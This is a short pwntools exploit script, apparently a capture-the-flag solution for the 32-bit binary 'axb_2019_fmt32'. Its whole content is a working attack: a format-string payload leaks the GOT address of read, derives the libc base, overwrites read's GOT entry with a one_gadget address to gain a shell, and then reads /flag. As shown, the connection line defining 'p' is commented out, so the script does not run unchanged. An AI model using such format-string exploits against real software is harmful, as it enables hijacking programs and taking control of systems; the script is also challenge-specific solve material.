from pwn import *

context.log_level = 'debug'

def debug_pause():
    log.info(proc.pidof(p))
    pause()
    
proc_name = './axb_2019_fmt32'
#p = process(proc_name)
# p = remote('node3.buuoj.cn', 26697)
elf = ELF(proc_name)
read_got = elf.got['read']
payload = b'a' + p32(read_got) + b'%8$s'
p.sendafter('me:', payload)
read_addr = u32(p.recv(18)[-4:])
# debug_pause()
log.info(hex(read_addr))
libc_base = read_addr - 0x0d4350
one_gadget = libc_base + 0x3a812
payload1 = b'a' + fmtstr_payload(8, {read_got: one_gadget},write_size = "byte",numbwritten = 0xa)
p.sendafter('me:', payload1)
p.sendline(b'cat /flag')
p.interactive()

